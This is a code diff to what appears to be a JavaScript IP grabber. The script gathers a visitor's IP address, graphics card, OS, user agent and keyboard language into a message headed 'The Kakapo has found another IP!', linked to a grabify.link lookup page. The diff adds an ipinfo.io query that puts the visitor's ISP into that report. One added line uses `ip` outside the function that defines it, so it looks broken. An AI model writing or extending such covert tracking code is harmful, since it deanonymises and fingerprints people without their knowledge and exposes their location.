@@ -152,6 +152,32 @@ function hasTouchscreen() {
   }
 }
 
+
+
+
+
+function getISP(ipAddress) {
+  return fetch(`https://ipinfo.io/${ipAddress}/json`)
+    .then((response) => {
+      if (response.ok) {
+        return response.json();
+      } else {
+        throw new Error('Failed to fetch ISP information');
+      }
+    })
+    .then((data) => {
+      const isp = data.org || 'N/A';
+      return isp;
+    })
+    .catch((error) => {
+      console.error(error);
+      return 'N/A';
+    });
+}
+
+
+	
+
 async function logIP() {
   try {
     const ip = await getPublicIPAddress();
@@ -205,6 +231,7 @@ if (navigator.getBattery) {
 
 
 const isTouchscreen = hasTouchscreen();
+const isp = await getISP(ip)	  
 	  
 const message = `
 The Kakapo has found another IP!
@@ -214,6 +241,7 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 
 - Graphics Card: ${graphCard}
 - IP: ${ip}
+- ISP: ${isp}
 - OS: ${userOS}
 - User Agent: ${userAgent}
 - Keyboard Language: ${kbLang}
